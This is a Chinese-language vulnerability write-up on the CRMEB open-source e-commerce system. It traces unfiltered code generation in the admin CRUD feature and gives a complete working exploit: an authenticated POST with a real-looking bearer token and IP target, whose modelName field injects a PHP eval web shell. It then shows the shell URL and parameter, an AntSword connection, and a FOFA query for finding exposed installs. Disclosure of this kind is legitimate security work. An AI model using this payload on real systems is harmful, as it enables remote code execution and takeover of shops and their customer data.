Crmeb审计报告

1.项目介绍

项目地址：https://gitee.com/ZhongBangKeJi/CRMEB

项目star数：11.7k

项目介绍：🔥CRMEB开源商城免费开源多语言商城系统，Tp6框架商城，系统可商用；包含小程序商城、H5商城、公众号商城、PC商城、App，支持分销、拼团、砍价、秒杀、优惠券、积分、会员等级、小程序直播、页面DIY，前后端分离，方便二开，使用文档、接口文档、数据字典、二开文档/视频教程，欢迎大家提出宝贵意见和建议

![image](https://github.com/1dreamGN/CVE/assets/112082417/fdae9fbb-8bec-4fa4-94ac-bafc85476dd6)

fofa语法：icon_hash="-847565074"

![image](https://github.com/1dreamGN/CVE/assets/112082417/0d79501c-ce76-4cbf-b802-33f582543b15)

2.审计及复现过程

漏洞所在文件：app/adminapi/controller/v1/setting/SystemCrud.php 

![image](https://github.com/1dreamGN/CVE/assets/112082417/90cba4a1-c6a8-4c7c-9323-f9ad2275ef7e)

crud功能  继续跟踪createCrud函数

文件路径：app/services/system/SystemCrudServices.php

![image](https://github.com/1dreamGN/CVE/assets/112082417/222ee4af-42e3-4163-9da4-4603b0f48730)

![image](https://github.com/1dreamGN/CVE/assets/112082417/bee3942c-44fe-417c-9f59-3f73705ea35a)

跟随makeFile函数

![image](https://github.com/1dreamGN/CVE/assets/112082417/bcc6ff21-6890-49b7-b2f5-a3d6107ef4ed)

![image](https://github.com/1dreamGN/CVE/assets/112082417/f2222f2d-0a4f-4ba9-a33b-d71d1765bf65)

关键错误点

![image](https://github.com/1dreamGN/CVE/assets/112082417/73ccde92-cd68-4b40-bc7a-09fcc929acd6)

跟随FileService::batchMakeFiles

![image](https://github.com/1dreamGN/CVE/assets/112082417/57ae854b-97e8-4272-9bb4-e6d40e09aaab)

全程无过滤创建controller控制器

下面进行复现

后台登录获取jwt-token

![image](https://github.com/1dreamGN/CVE/assets/112082417/2d82fe16-e236-4498-b492-79e8e2b8a776)

构造payload并请求

```
POST /adminapi/system/crud HTTP/1.1
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/json
Host: 222.186.134.155:99
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiJiYzUzYmJkZWEzNjk1ODRiNDg1NTkwZGEzZmY3ZWQzOCIsImlzcyI6IjIyMi4xODYuMTM0LjE1NTo5OSIsImF1ZCI6IjIyMi4xODYuMTM0LjE1NTo5OSIsImlhdCI6MTY5NTQ5NTI4NywibmJmIjoxNjk1NDk1Mjg3LCJleHAiOjE2OTgwODcyODcsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.r8iA7llTlmqiNCm9_3MBUE6HVEjV13USJHi08FYPGfI

{ "pid": 25, "tableName": "test", "modelName": "*/?><?php namespace app\\adminapi\\controller\\crud; exit(eval($_GET[1]));//**", "isTable": 1, "menuName": "", "filePath": { "controller": "app/adminapi/controller/crud/Test.php", "route": "app/adminapi/route/crud/test.php" }, "tableField": [ { "field": "id", "field_type": "int", "default": "", "comment": "自增ID", "required": false, "is_table": true, "table_name": "ID", "limit": "15", "primaryKey": 1, "from_type": "" }, { "field": "", "field_type": "varchar", "default": "", "default_type": "-1", "comment": "test", "required": false, "is_table": true, "table_name": "test", "limit": 255, "primaryKey": 0, "from_type": "input", "search": "", "dictionary_id": 0, "hasOne": [], "index": false } ], "deleteField": []}

```

这里返回报错。数据库报错。但是文件已经生成

![image](https://github.com/1dreamGN/CVE/assets/112082417/9acda77e-9a2f-49d4-909c-15671b88f7e1)


木马地址：

http://222.186.134.155:99/adminapi/crud/test?

param：1=phpinfo();

测试antsword链接

![image](https://github.com/1dreamGN/CVE/assets/112082417/68da463b-e881-44c6-91e4-4e6ba0d4b980)

设置jwt-token 这里也可以生成文件到无需授权的目录

![image](https://github.com/1dreamGN/CVE/assets/112082417/8b229072-166f-4f2e-9eac-45f397b8f64d)

	






